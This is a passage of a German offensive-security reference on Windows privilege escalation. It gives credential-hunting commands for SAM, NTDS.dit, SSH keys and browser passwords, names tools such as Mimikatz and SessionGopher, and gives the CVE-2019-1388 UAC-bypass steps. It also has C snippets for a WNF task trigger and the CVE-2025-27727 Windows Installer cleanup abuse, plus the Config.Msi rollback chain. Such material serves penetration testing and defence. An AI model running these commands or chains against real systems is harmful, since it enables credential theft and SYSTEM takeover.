dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Anmeldedaten im Papierkorb

Sie sollten auch den Papierkorb auf Anmeldedaten überprüfen.

Prüfen Sie zugängliche Einträge im Papierkorb auf gelöschte Backups und Konfigurationsarchive sowie auf Dateien, deren Namen ausdrücklich auf Anmeldedaten hinweisen. Ein nützliches `.7z`-, `.zip`- oder `.rar`-Backup kann Monate alt sein und einen gewöhnlichen Dateinamen haben. Windows speichert den ursprünglichen Pfad und den Löschzeitpunkt in einem `$I`-Datensatz und die gelöschte Datei als zugehörigen `$R`-Eintrag. Prüfen Sie die Metadaten und den Lesezugriff der aktuellen Identität, bevor Sie ein Archiv öffnen. Die Sichtbarkeit hängt vom Volume, der Benutzer-SID und den Dateiberechtigungen ab. Eine leere Auflistung beweist daher nicht, dass kein wiederherstellbares Backup vorhanden ist. Betrachten Sie einen Archivnamen als Kandidaten für eine Prüfung, nicht als Beweis dafür, dass es ein gültiges Geheimnis enthält.

Eine zugängliche gelöschte `.pfx`-Datei kann auch ein Hinweis auf **Code-Signing** sein. Wenn sie einen zugänglichen privaten Schlüssel enthält, kann der Schlüssel ein geändertes PowerShell-Skript signieren; [PowerShell erfordert ein Code-Signing-Zertifikat mit privatem Schlüssel](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), und [AppLocker-Publisherregeln werten die Identität des Signierers und den Regelumfang aus](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Für die kontoübergreifende Ausführung muss die aktuelle Identität das genaue Skript ändern können, eine wirksame Regel muss die resultierende Signatur für das Skript und das Zielkonto akzeptieren, und eine geplante Aufgabe oder ein anderer Prozess mit höheren Berechtigungen muss das Skript tatsächlich ausführen. Ein `.pfx`-Dateiname, ein Zertifikatsinhaber oder ein beschreibbares Skript allein belegt diese Kette nicht. Prüfen Sie Metadaten, ACLs, Richtlinien und den geplanten Befehl, bevor Sie Material mit privaten Schlüsseln öffnen oder die Aufgabe auslösen.

Prüfen Sie auch zugängliche Profil-Datenbanken von Messaging-Clients, Notizen und empfangene Dateien auf Hinweise auf Anmeldedaten. Ein BitLocker-Wiederherstellungsschlüsselexport kann als HTML- oder TXT-Datei gespeichert sein, manchmal in einem benannten Backup-Archiv. Solches Material kann den Zugriff auf ein separates verschlüsseltes Datenvolume ermöglichen, das ältere Backups enthält. Untersuchen Sie das Volume und das Archiv nur, wenn der Zugriff autorisiert ist. Wenn ein Backup `NTDS.dit` enthält, erfordert die Offline-Wiederherstellung von Domänenanmeldedaten außerdem den passenden `SYSTEM`-Hive, wie im [Workflow für Backups und privilegierte Gruppen](../active-directory-methodology/privileged-groups-and-token-privileges.md) beschrieben. Dateinamen und ein gesperrtes Volume allein belegen nicht, dass ein verwendbarer Wiederherstellungsschlüssel oder ein Domänenbackup vorhanden ist.

Um mit verschiedenen Programmen gespeicherte **Passwörter wiederherzustellen**, können Sie Folgendes verwenden: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### In der Registry

**Weitere mögliche Registry-Schlüssel mit Anmeldedaten**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Browserverlauf

Sie sollten nach Datenbanken suchen, in denen Passwörter aus **Chrome oder Firefox** gespeichert sind.\
Sie sollten nach Datenbanken suchen, in denen Passwörter aus **Chrome, Edge oder Firefox** gespeichert sind.\
Prüfen Sie auch den Verlauf, die Lesezeichen und Favoriten der Browser, da dort möglicherweise **Passwörter gespeichert sind**.

Beim herkömmlichen **Default**-Profil des aktuellen Benutzers befindet sich `Login Data` unter `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, während `Local State` im übergeordneten Verzeichnis `User Data` liegt. [Microsoft dokumentiert den Standardspeicherort des Profils](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); ein anderes Profil oder eine `UserDataDir`-Richtlinie kann den Speicherort ändern. Das Vorhandensein einer Datei ist lediglich ein Hinweis auf einen möglichen Speicherort von Zugangsdaten: Prüfen Sie, ob die Dateien lesbar sind, ob der DPAPI-Kontext des betreffenden Benutzers oder anderes autorisiertes Schlüsselmaterial verfügbar ist und ob ein gespeicherter Login zu einem privilegierteren Konto gehört. Eine reine Auflistung der Pfade muss weder die Datenbank öffnen noch entschlüsselte Passwörter ausgeben.

Für Firefox dokumentiert [Mozilla](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), dass `key4.db` und `logins.json` eines Profils zusammengehörige Schlüssel- und Dateien mit verschlüsselten Logins sind. Ihr Vorhandensein ist lediglich ein Hinweis: Prüfen Sie, ob beide Dateien lesbar sind, ob gespeicherte Einträge vorhanden sind und ob ein Primary Password den Schlüssel schützt, bevor Sie zu dem Schluss kommen, dass die Zugangsdaten verwendet werden können. Gehört ein wiederhergestellter Zugang zu einem Domänenkonto, prüfen Sie separat die effektiven Gruppensteuerungsrechte dieses Kontos sowie die [LAPS-Berechtigungen zum Lesen oder Entschlüsseln von Passwörtern](../active-directory-methodology/laps.md) der Gruppe; Browser-Artefakte allein belegen keinen Pfad zu Administratorrechten.

Tools zum Extrahieren von Passwörtern aus Browsern:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** ist eine in das Windows-Betriebssystem integrierte Technologie, die die **Kommunikation** zwischen Softwarekomponenten unterschiedlicher Sprachen ermöglicht. Jede COM-Komponente wird durch eine **class ID (CLSID)** identifiziert und jede Komponente stellt Funktionen über eine oder mehrere Schnittstellen bereit, die durch interface IDs (IIDs) identifiziert werden.

COM-Klassen und -Schnittstellen werden in der Registry unter **HKEY\CLASSES\ROOT\CLSID** bzw. **HKEY\CLASSES\ROOT\Interface** definiert. Diese Registry entsteht durch das Zusammenführen von **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

In den CLSIDs dieser Registry finden Sie den Unterschlüssel **InProcServer32**, der einen **Standardwert** enthält, der auf eine **DLL** verweist, sowie einen Wert namens **ThreadingModel**, der **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single- oder Multi-Threaded) oder **Neutral** (Thread-Neutral) sein kann.

![Browserverlauf - COM DLL Overwriting: In den CLSIDs dieser Registry finden Sie den Unterschlüssel InProcServer32, der einen Standardwert enthält, der auf eine DLL verweist, sowie einen Wert...](<../../images/image (729).png>)

Wenn Sie also **eine der auszuführenden DLLs überschreiben** können, könnten Sie **Ihre Berechtigungen erweitern**, falls diese DLL von einem anderen Benutzer ausgeführt wird.

Weitere Informationen dazu, wie Angreifer COM Hijacking als Persistenzmechanismus nutzen, finden Sie hier:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Allgemeine Suche nach Passwörtern in Dateien und der Registry**

**Dateiinhalte durchsuchen**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Nach einer Datei mit einem bestimmten Dateinamen suchen**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Durchsuche die Registry nach Schlüsselnamen und Passwörtern**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Tools zur Suche nach Passwörtern

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ist ein msf**-Plugin, das ich erstellt habe, um **automatisch jedes Metasploit-POST-Modul auszuführen, das im Opfer nach Zugangsdaten sucht**.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) durchsucht automatisch alle Dateien, die die auf dieser Seite erwähnten Passwörter enthalten.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ist ein weiteres großartiges Tool, um Passwörter aus einem System auszulesen.

Das Tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) sucht nach **Sitzungen**, **Benutzernamen** und **Passwörtern** für verschiedene Tools, die diese Daten im Klartext speichern (PuTTY, WinSCP, FileZilla, SuperPuTTY und RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Stell dir vor, **ein als SYSTEM laufender Prozess öffnet einen neuen Prozess** (`OpenProcess()`) **mit Vollzugriff**. Derselbe Prozess **erstellt außerdem einen neuen Prozess** (`CreateProcess()`) **mit niedrigen Berechtigungen, der jedoch alle offenen Handles des Hauptprozesses erbt**.\
Wenn du anschließend **Vollzugriff auf den Prozess mit niedrigen Berechtigungen hast**, kannst du dir das **offene Handle des mit `OpenProcess()` erstellten privilegierten Prozesses** holen und **Shellcode injizieren**.\
[In diesem Beispiel erfährst du mehr darüber, **wie du diese Schwachstelle erkennst und ausnutzt**.](leaked-handle-exploitation.md)\
[In diesem **anderen Beitrag erfährst du ausführlicher, wie du weitere offene Handles von Prozessen und Threads testen und missbrauchen kannst, die mit unterschiedlichen Berechtigungsstufen (nicht nur Vollzugriff) vererbt wurden**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Gemeinsam genutzte Speichersegmente, sogenannte **Pipes**, ermöglichen die Kommunikation zwischen Prozessen und die Übertragung von Daten.

Windows bietet eine Funktion namens **Named Pipes**, mit der nicht verwandte Prozesse Daten gemeinsam nutzen können, sogar über verschiedene Netzwerke hinweg. Das ähnelt einer Client/Server-Architektur mit den Rollen **Named-Pipe-Server** und **Named-Pipe-Client**.

Wenn ein **Client** Daten über eine Pipe sendet, kann der **Server**, der die Pipe eingerichtet hat, **die Identität des Clients annehmen**, sofern er über die erforderlichen **SeImpersonate**-Rechte verfügt. Wenn du einen **privilegierten Prozess** findest, der über eine Pipe kommuniziert, die du nachahmen kannst, bietet sich dir die Gelegenheit, **höhere Berechtigungen zu erlangen**, indem du die Identität dieses Prozesses annimmst, sobald er mit deiner eingerichteten Pipe interagiert. Hilfreiche Anleitungen zur Durchführung eines solchen Angriffs findest du [**hier**](named-pipe-client-impersonation.md) und [**hier**](#from-high-integrity-to-system).

Mit dem folgenden Tool kannst du außerdem **eine Named-Pipe-Kommunikation mit einem Tool wie Burp abfangen:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **Mit diesem Tool kannst du alle Pipes auflisten und anzeigen, um Privescs zu finden:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony-tapsrv: Remote-DWORD-Schreibzugriff zu RCE

Der Telephony-Dienst (TapiSrv) macht im Servermodus `\\pipe\\tapsrv` (MS-TRP) verfügbar. Ein entfernter, authentifizierter Client kann den auf Mailslots basierenden asynchronen Eventpfad missbrauchen, um `ClientAttach` in einen beliebigen **4-Byte-Schreibzugriff** auf eine vorhandene Datei umzuwandeln, auf die `NETWORK SERVICE` Schreibzugriff hat. Anschließend kann er Telephony-Adminrechte erlangen und eine beliebige DLL als Dienst laden. Der vollständige Ablauf:

- `ClientAttach` mit `pszDomainUser`, das auf einen vorhandenen, beschreibbaren Pfad gesetzt ist → der Dienst öffnet die Datei mit `CreateFileW(..., OPEN_EXISTING)` und verwendet sie für asynchrone Event-Schreibzugriffe.
- Jedes Event schreibt den vom Angreifer kontrollierten `InitContext` aus `Initialize` in dieses Handle. Registriere mit `LRegisterRequestRecipient` (`Req_Func 61`) eine Line-App, löse `TRequestMakeCall` (`Req_Func 121`) aus, rufe die Events mit `GetAsyncEvents` (`Req_Func 0`) ab und registriere die App anschließend ab bzw. fahre sie herunter, um die deterministischen Schreibzugriffe zu wiederholen.
- Füge dich in `C:\Windows\TAPI\tsec.ini` zu `[TapiAdministrators]` hinzu, verbinde dich erneut und rufe `GetUIDllName` mit einem beliebigen DLL-Pfad auf, um `TSPI_providerUIIdentify` als `NETWORK SERVICE` auszuführen.

Weitere Details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Sonstiges

### Dateierweiterungen, mit denen sich unter Windows Programme ausführen lassen

Sieh dir die Seite **[https://filesec.io/](https://filesec.io/)** an.

### Missbrauch von Protocol Handlern / ShellExecute über Markdown-Renderer

An `ShellExecuteExW` weitergeleitete, anklickbare Markdown-Links können gefährliche URI-Handler (`file:`, `ms-appinstaller:` oder jedes registrierte Schema) auslösen und vom Angreifer kontrollierte Dateien als aktueller Benutzer ausführen. Siehe:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Befehlszeilen auf Passwörter überwachen**

Wenn du eine Shell als Benutzer erhältst, werden möglicherweise geplante Tasks oder andere Prozesse ausgeführt, die **Anmeldedaten über die Befehlszeile übergeben**. Das folgende Skript erfasst alle zwei Sekunden die Befehlszeilen von Prozessen und vergleicht den aktuellen Zustand mit dem vorherigen. Dabei gibt es alle Unterschiede aus.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Passwörter aus Prozessen stehlen

## Vom Benutzer mit niedrigen Privilegien zu NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Wenn du Zugriff auf die grafische Benutzeroberfläche hast (über die Konsole oder RDP) und UAC aktiviert ist, kannst du in einigen Versionen von Microsoft Windows als nicht privilegierter Benutzer ein Terminal oder einen anderen Prozess als „NT\AUTHORITY SYSTEM“ ausführen.

Dadurch lassen sich mit derselben Schwachstelle gleichzeitig Privilegien eskalieren und UAC umgehen. Außerdem muss nichts installiert werden, und die während des Vorgangs verwendete Binärdatei ist von Microsoft signiert und herausgegeben.

Zu den betroffenen Systemen gehören unter anderem:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Um diese Schwachstelle auszunutzen, müssen die folgenden Schritte ausgeführt werden:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

Sie finden alle erforderlichen Dateien und Informationen im folgenden GitHub-Repository:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Von Administrator-Medium zu hoher Integritätsstufe / UAC-Bypass

Lesen Sie dies, um **mehr über Integritätsstufen zu erfahren**:


{{#ref}}
integrity-levels.md
{{#endref}}

Lesen Sie dann dies, um **mehr über UAC und UAC-Bypasses zu erfahren:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Upload-Verzeichnis-Junctions in ein bereitgestelltes Stammverzeichnis

Eine Anwendung kann ein vorhersehbares Upload-Unterverzeichnis erstellen, einen vom Aufrufer angegebenen Dateinamen darin speichern und die Datei anschließend verarbeiten. Wenn ein Benutzer mit niedrigen Berechtigungen dieses Unterverzeichnis vor dem serverseitigen Schreibvorgang löschen und durch eine NTFS-Junction ersetzen kann, kann der Schreibvorgang der Junction in ein über das Web bereitgestelltes Verzeichnis folgen. Ein dort abgelegtes Skript kann mit der Identität des Webdienstes ausgeführt werden, wenn der Server diesen Dateityp ausführt. Dies ist eine anwendungsspezifische Grenze für beliebige Schreibvorgänge; ein beschreibbares Upload-Verzeichnis oder eine vorhandene Junction allein beweist das nicht.

Prüfen Sie die genaue Pfadbildung und den Zeitpunkt im Upload-Handler, die effektiven Lösch- und Erstellungsrechte des Benutzers für das Unterverzeichnis, die effektiven ACLs des Ziels, ob der Schreibprozess Reparse Points folgt und ob der Webserver Dateien in diesem Ziel ausführt. Bestätigen Sie die Prozessidentitäten des Schreibprozesses und des Webservers getrennt. Eine passive Bestandsaufnahme kann Verzeichnis-ACLs und Reparse-Metadaten zeigen, aber weder das Verhalten des Handlers noch einen späteren Austausch der Junction belegen. Wenn die Ausführung in einem Dienstkonto erfolgt, prüfen Sie das **tatsächliche Prozesstoken**, bevor Sie einen separaten Pfad über Token-Berechtigungen in Betracht ziehen.

## Durch WNF ausgelöste Bereinigung einer privilegierten geplanten Aufgabe

Eine geplante Aufgabe, die manuelle Ausführung verweigert, kann dennoch einen unprivilegierten Auslöser bereitstellen. Wenn Sie eine privilegierte Aufgabe überprüfen, exportieren Sie deren XML und prüfen Sie **alle** Auslöser sowie die Aufgaben-DACL, den Prinzipal und die Aktion. Insbesondere nennt ein `WnfStateChangeTrigger` einen Windows Notification Facility (WNF)-Zustand. Wenn dieser sicherbare Zustand es dem aktuellen Benutzer erlaubt, eine Aktualisierung zu veröffentlichen, kann der Benutzer die Aufgabe indirekt mit der konfigurierten Identität starten, obwohl `<AllowStartOnDemand>false</AllowStartOnDemand>` gesetzt ist.<sup>[[43]](#references)</sup>

Zum Beispiel lief die Recall-Aufgabe `\Microsoft\Windows\WindowsAI\Recall\PolicyConfiguration` als SYSTEM, akzeptierte Aktualisierungen des WNF-Zustands `7508BCA32C079E41` von einem Standardbenutzer und untersuchte anschließend `%LOCALAPPDATA%\CoreAIPlatform.00\UKP\{GUID}`, selbst wenn Recall deaktiviert war.<sup>[[43]](#references)</sup>

```powershell
schtasks /query /tn "<TASK>" /xml > task.xml
Select-String -Path .\task.xml -Pattern 'WnfStateChangeTrigger|StateName|UserId|ClassId|AllowStartOnDemand'
```

Um die Erreichbarkeit zu testen, lösen Sie `ZwUpdateWnfStateData` aus `ntdll.dll` auf, übermitteln Sie ein leeres Update für den acht Byte langen Zustandsnamen und gleichen Sie den Rückgabestatus mit den Daten zum letzten Lauf der Task oder den Procmon-Aktivitäten ab. Die folgende reduzierte Probe verwendet die Bytefolge aus dem Recall-Task-Beispiel; ersetzen Sie sie durch die für die getestete Task exportierten Bytes.<sup>[[43]](#references)</sup>

```c
#include <windows.h>
#include <winternl.h>
typedef NTSTATUS (WINAPI *UpdateWnf)(PVOID,PVOID,ULONG,PVOID,PVOID,PVOID,ULONG);
int main(void) {
    unsigned char stateName[8] = {0x75,0x08,0xBC,0xA3,0x2C,0x07,0x9e,0x41};
    HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
    UpdateWnf update = (UpdateWnf)GetProcAddress(ntdll, "ZwUpdateWnfStateData");
    if (!update) return 1;
    return update(stateName, NULL, 0, NULL, NULL, NULL, 0) < 0;
}
```

### Privilegiertes Löschen durch rekursive Bereinigung

Der nützliche Primitive ist nicht allein der Trigger, sondern eine privilegierte Bereinigungsroutine, die ein vom Angreifer kontrolliertes Verzeichnis akzeptiert. Verfolge den Vorgang von der Auflistung bis zur abschließenden Änderung: Profil-/Sitzungserkennung, per Wildcard ausgewählte untergeordnete Elemente, `SHCreateItemFromParsingName` und `IFileOperation::DeleteItem` sind starke Indikatoren dafür, dass ein zuvor geprüfter Pfad später rekursiv durchlaufen wird. Wenn Nachfahren nicht relativ zu vertrauenswürdigen Verzeichnis-Handles geöffnet und vor dem Löschen validiert werden, kann ein Angreifer die Pfadauflösung zwischen Auflistung und Verwendung ändern.<sup>[[43]](#references)</sup>

Kombiniere den WNF-Trigger mit der unten beschriebenen [Oplock-, Junction- und Object-Manager-Symlink-Ersetzung](#from-folder-contents-delete-to-system-eop): Der Oplock pausiert die Bereinigungsroutine, nachdem sie das legitime untergeordnete Element ausgewählt hat. Währenddessen wird der beschreibbare Vorfahr ersetzt, sodass der fortgesetzte privilegierte Löschvorgang über `\RPC Control` zum geschützten Ziel aufgelöst wird. In der Recall-Kette führte dies zum Löschen von `C:\Config.Msi` durch SYSTEM, wie es die dokumentierte MSI-Rollback-Technik erfordert.<sup>[[31]](#references)[[43]](#references)</sup>

### Verschachtelte Nachfahren umgehen oberflächliche Reparse-Point-Korrekturen

Nur den vom Angreifer kontrollierten Stamm und dessen direktes untergeordnetes Element zu validieren, sichert keinen rekursiven pfadbasierten Löschvorgang ab. Lasse diese geprüften Objekte legitim und verlagere die Junction-/Oplock-Ersetzung in ein zusätzliches untergeordnetes Element darunter; `IFileOperation::DeleteItem` erreicht schließlich den nicht validierten Nachfahren und folgt dessen neuem Ziel. CVE-2026-20941 entstand genau durch diese Art unvollständiger Korrektur: Der erste Recall-Patch validierte `UKP` und das GUID-förmige Verzeichnis, verwendete aber weiterhin den alten rekursiven Löschvorgang.<sup>[[43]](#references)</sup>

Das sichere Muster besteht darin, **jeden Nachfahren** relativ zu einem bereits vertrauenswürdigen Verzeichnis-Handle zu öffnen, den endgültig aufgelösten Pfad/das Objekt abzurufen und zu überprüfen und die Löschdisposition auf dieses verifizierte Handle anzuwenden. Validiere kein Präfix und kehre anschließend zu einem rekursiven pfadbasierten Löschvorgang zurück. Prüfe beim Patch-Review auch Strukturen an der tatsächlichen Aufrufstelle: In diesem Fall zeigte die Laufzeitinspektion von `OBJECT_ATTRIBUTES` bei `NtCreateFile` ein nicht-NULL-`RootDirectory` und einen relativen Namen `{GUID}\\secure_file.lock`. Damit wurde eine irreführende Decompiler-Ausgabe widerlegt, die auf einen zweiten `FILE_DELETE_ON_CLOSE`-Primitive hindeutete.<sup>[[43]](#references)</sup>

## Von beliebigem Ordnerlöschen/-verschieben/-umbenennen zu SYSTEM-EoP

Die Technik wird [**in diesem Blogbeitrag**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) beschrieben; Exploit-Code ist [**hier verfügbar**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Bei dem Angriff wird im Wesentlichen die Rollback-Funktion von Windows Installer missbraucht, um während der Deinstallation legitime Dateien durch bösartige zu ersetzen. Dazu muss der Angreifer einen **bösartigen MSI-Installer** erstellen, mit dem der Ordner `C:\Config.Msi` übernommen wird. Windows Installer verwendet diesen später, um während der Deinstallation anderer MSI-Pakete Rollback-Dateien zu speichern. Diese Rollback-Dateien werden so verändert, dass sie die bösartige Payload enthalten.

### Windows Installer COM-Bereinigungspfad-Injektion (CVE-2025-27727)

Ein Client mit niedrigen Berechtigungen kann über das COM-Objekt `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`) den SYSTEM-Dienst `msiexec.exe` erreichen. Reverse Engineering identifizierte die relevanten `IMsiServer`-Aufrufe als `MsiBeginTransactionW` bei Vtable-Offset `0xA0`, `SetEEUIDirectoryAndFilter` bei `0xC8` und `CleanupTempPackages` bei `0x50`. Diese Namen und Offsets wurden durch Reverse Engineering ermittelt und können sich zwischen Builds unterscheiden.<sup>[[41]](#references)</sup>

Für einen Nicht-Administrator impersoniert `SetEEUIDirectoryAndFilter` den Aufrufer nur während des Öffnens des angegebenen Pfads mit `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` und `FILE_FLAG_OPEN_REPARSE_POINT`. Dies belegt, dass der Aufrufer das Verzeichnis löschen kann, und verhindert, dass einem Reparse Point gefolgt wird. Es bindet das geprüfte Dateiobjekt jedoch **nicht** an die spätere Bereinigung und beweist auch nicht, dass Windows Installer es erstellt hat.<sup>[[41]](#references)</sup>

Nach `MsiBeginTransactionW` plant `SetEEUIDirectoryAndFilter` den Pfad unabhängig vom Filterargument des Aufrufers als Ordner ein. Der Dienst schreibt einen benannten `REG_DWORD`-Wert unter `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: Der Wertname ist der vom Aufrufer kontrollierte Pfad, und die Daten `0x00000002` kennzeichnen den Ordner. `CleanupTempPackages(NULL, FALSE)` startet anschließend direkt die Bereinigung. Der privilegierte Worker listet die Registrierungswerte auf und übergibt Ordner-Einträge ohne Prüfung der Pfadherkunft an die rekursive Funktion `FDeleteFolder`. Falls das normale Entfernen fehlschlägt, ruft der Code außerdem `LockdownPath` auf, löscht Dateiattribute und versucht es erneut.<sup>[[41]](#references)</sup>

Die aus `msi.dll` rekonstruierte minimale Aufrufsequenz lautet:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Das nützliche Primitiv ist die Wiederverwendung eines Pfads und keine Umleitung über eine Junction. Registriere ein vom Angreifer erstelltes `C:\Config.Msi`, entferne es und lass Windows Installer später denselben Pfad mit geschützten Rollback-Daten neu erstellen. Die Bereinigung vertraut dem veralteten Namen `TempPackages` und löscht das neue Verzeichnis als SYSTEM. Dadurch wird die vorgesehene Grenze durch `FILE_FLAG_OPEN_REPARSE_POINT` und die Mitigation für das Vertrauen in Umleitungen umgangen, da kein Reparse Point erforderlich ist.<sup>[[41]](#references)</sup>

Dieses Löschprimitiv passt in die folgende Rollback-Kette: Bewahre den separaten Eintrag `Installer\Folders`, lösche das geschützte `C:\Config.Msi`, erstelle es mit einer NULL-DACL neu und behalte einen Handle mit `WRITE_DAC`, bevor der Installer die DACL absichert. Mit dem vorab geöffneten Handle lässt sich über `NtSetSecurityObject` eine permissive DACL wiederherstellen. Danach kann die generierte `.rbs` ersetzt werden, bevor das Rollback fortgesetzt wird.<sup>[[41]](#references)</sup>

Microsoft hat den Pfad abgesichert, indem verhindert wird, dass `CMsiTransaction::SetEEUIDirectoryAndFilter` `ScheduleFileOrFolderDelete` aufruft, wenn das neue Feature-Gate aktiviert ist. Der COM-Aufruf kann weiterhin Erfolg zurückgeben, trägt den vom Angreifer kontrollierten Pfad aber nicht mehr in `TempPackages` ein. Installiere die Windows-Sicherheitsupdates vom April 2025, statt einen erfolgreichen Methodenaufruf als Nachweis für den Patch zu verwenden.<sup>[[41]](#references)[[42]](#references)</sup>

Die zusammengefasste Technik sieht folgendermaßen aus:

1. **Phase 1 – Vorbereitung des Hijack ( `C:\Config.Msi` leer lassen)**

- Schritt 1: MSI installieren
    - Erstelle eine `.msi`, die eine harmlose Datei (z. B. `dummy.txt`) in einem beschreibbaren Ordner (`TARGETDIR`) installiert.
    - Markiere den Installer als **„UAC Compliant“**, damit ein **Benutzer ohne Admin-Rechte** ihn ausführen kann.
    - Lass nach der Installation einen **Handle** für die Datei geöffnet.

- Schritt 2: Deinstallation starten
    - Deinstalliere dieselbe `.msi`.
    - Der Deinstallationsprozess beginnt, Dateien nach `C:\Config.Msi` zu verschieben und sie in `.rbf`-Dateien umzubenennen (Rollback-Backups).
    - **Überwache den geöffneten Datei-Handle** mit `GetFinalPathNameByHandle`, um festzustellen, wann die Datei zu `C:\Config.Msi\<random>.rbf` wird.

- Schritt 3: Benutzerdefinierte Synchronisierung
    - Die `.msi` enthält eine **benutzerdefinierte Deinstallationsaktion (`SyncOnRbfWritten`)**, die:
        - signalisiert, sobald die `.rbf` geschrieben wurde.
